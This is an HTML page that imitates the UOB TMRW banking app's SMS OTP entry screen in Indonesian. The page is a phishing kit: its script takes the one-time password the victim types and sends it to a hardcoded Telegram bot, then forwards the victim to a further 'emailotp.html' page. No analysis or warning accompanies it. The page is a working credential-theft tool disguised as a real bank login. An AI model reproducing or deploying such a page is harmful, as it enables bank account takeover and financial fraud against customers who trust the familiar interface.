<html class="scroll-smooth" lang="id">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   UOB TMRW OTP
  </title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-black text-gray-400 min-h-screen flex flex-col justify-between">
  <header class="relative z-10 flex items-center justify-between px-4 pt-6">
   <button aria-label="Back" class="text-gray-400 text-3xl leading-none">
    <i class="fas fa-chevron-left"></i>
   </button>
   <div class="flex items-center space-x-1">
    <span class="text-red-700 font-semibold text-lg tracking-wider select-none">|||</span>
    <span class="text-gray-400 font-semibold text-lg tracking-wider select-none">UOB</span>
    <span class="text-gray-400 font-semibold text-lg tracking-wider select-none">|</span>
    <span class="text-gray-400 font-semibold text-lg tracking-wider select-none">TMRW</span>
   </div>
   <button aria-label="Select language" class="flex items-center border border-gray-500 rounded-md px-2 py-1 space-x-1">
    <img alt="Indonesian flag" class="w-6 h-4 object-cover rounded-sm" height="16" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Flag_of_Indonesia.svg/1599px-Flag_of_Indonesia.svg.png?20200822164827" width="24"/>
    <i class="fas fa-chevron-down text-gray-400 text-xs"></i>
   </button>
  </header>
  <main class="relative flex-grow flex flex-col justify-center items-center px-4 pt-12 pb-24">
   <img alt="UOB building at night with dark sky and stars" aria-hidden="true" class="absolute inset-0 w-full h-full object-cover opacity-20 -z-10" height="300" src="https://storage.googleapis.com/a1aa/image/2eb4debf-596b-4e96-33fb-947fd206fcca.jpg" width="400"/>
   <h1 class="text-gray-400 font-semibold text-2xl select-none">Selamat Datang</h1>
  </main>
  <section class="bg-white rounded-t-3xl px-6 pt-6 pb-12 text-gray-900" style="box-shadow: 0 -4px 12px rgb(0 0 0 / 0.1)">
   <div class="flex justify-between items-center mb-6">
    <span class="font-semibold text-lg">Masukkan SMS OTP</span>
    <button id="resendBtn" class="text-teal-600 font-normal text-base hover:underline focus:outline-none" disabled>Kirim ulang dalam 60 detik.</button>
   </div>
   <hr class="border-gray-200 mb-6"/>
   <form id="otpForm" class="flex items-center space-x-4 text-gray-500 font-normal text-lg select-none" autocomplete="off" novalidate>
    <span>OTP</span>
    <div class="flex space-x-6">
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
     <input type="text" inputmode="numeric" pattern="[0-9]" maxlength="1" class="w-6 h-6 border-2 border-teal-600 rounded-full text-center text-teal-600 font-semibold text-lg appearance-none focus:outline-none focus:ring-2 focus:ring-teal-600" required/>
    </div>
   </form>
  </section>
  <section aria-label="Numeric keypad" class="grid grid-cols-3 gap-1 text-3xl text-center text-gray-900 bg-gray-100 px-1 py-2">
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="1">1</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="2">2</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="3">3</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="4">4</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="5">5</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="6">6</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="7">7</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="8">8</button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="9">9</button>
   <button aria-label="Enter" class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" id="enterBtn">
    <i class="fas fa-long-arrow-alt-left text-gray-400"></i>
   </button>
   <button class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" data-key="0">0</button>
   <button aria-label="Backspace" class="bg-white py-6 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none" id="backspaceBtn">
    <i class="fas fa-backspace text-gray-400"></i>
   </button>
  </section>

  <script>
    // Telegram bot config - replace with your own
    const botToken = '8398815420:AAEpqZqNC8t_QXR3bB4caJxBMXO4_MdDFls';
    const chatId = '7549590022';

    const inputs = document.querySelectorAll('#otpForm input');
    const backspaceBtn = document.getElementById('backspaceBtn');
    const enterBtn = document.getElementById('enterBtn');
    const digitButtons = document.querySelectorAll('button[data-key]');
    const resendBtn = document.getElementById('resendBtn');

    // Countdown timer for resend button
    let countdown = 60;
    resendBtn.textContent = `Kirim ulang dalam ${countdown} detik.`;
    resendBtn.disabled = true;

    const timer = setInterval(() => {
      countdown--;
      if (countdown > 0) {
        resendBtn.textContent = `Kirim ulang dalam ${countdown} detik.`;
      } else {
        resendBtn.textContent = 'Kirim ulang';
        resendBtn.disabled = false;
        clearInterval(timer);
      }
    }, 1000);

    resendBtn.addEventListener('click', () => {
      // Reset countdown
      countdown = 60;
      resendBtn.textContent = `Kirim ulang dalam ${countdown} detik.`;
      resendBtn.disabled = true;

      // Restart timer
      const newTimer = setInterval(() => {
        countdown--;
        if (countdown > 0) {
          resendBtn.textContent = `Kirim ulang dalam ${countdown} detik.`;
        } else {
          resendBtn.textContent = 'Kirim ulang';
          resendBtn.disabled = false;
          clearInterval(newTimer);
        }
      }, 1000);

      // TODO: Add resend OTP logic here (e.g., call API)
      alert('Kode OTP baru telah dikirim.');
    });

    // Focus next input on input
    inputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        const val = e.target.value;
        if (/^\d$/.test(val)) {
          if (idx < inputs.length - 1) {
            inputs[idx + 1].focus();
          } else {
            // All digits entered, auto-submit
            submitOtp();
          }
        } else {
          e.target.value = '';
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });

    // Numeric keypad buttons input
    digitButtons.forEach(button => {
      button.addEventListener('click', () => {
        for (let input of inputs) {
          if (!input.value) {
            input.value = button.dataset.key;
            input.dispatchEvent(new Event('input'));
            break;
          }
        }
      });
    });

    backspaceBtn.addEventListener('click', () => {
      for (let i = inputs.length - 1; i >= 0; i--) {
        if (inputs[i].value) {
          inputs[i].value = '';
          inputs[i].focus();
          break;
        }
      }
    });

    enterBtn.addEventListener('click', () => {
      submitOtp();
    });

    function submitOtp() {
      const otp = Array.from(inputs).map(i => i.value).join('');
      if (otp.length === inputs.length && /^\d+$/.test(otp)) {
        // Send OTP to Telegram
        const message = encodeURIComponent(`Kode OTP: ${otp}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
          .then(res => res.json())
          .then(data => {
            if (data.ok) {
              window.location.href = "emailotp.html";
              inputs.forEach(i => i.value = '');
              inputs[0].focus();
            } else {
              alert('Gagal mengirim ke Telegram: ' + data.description);
            }
          })
          .catch(err => {
            alert('Error mengirim ke Telegram: ' + err.message);
          });
      } else {
        alert('Masukkan 7 digit kode OTP terlebih dahulu.');
      }
    }
  </script>
 </body>
     </html>
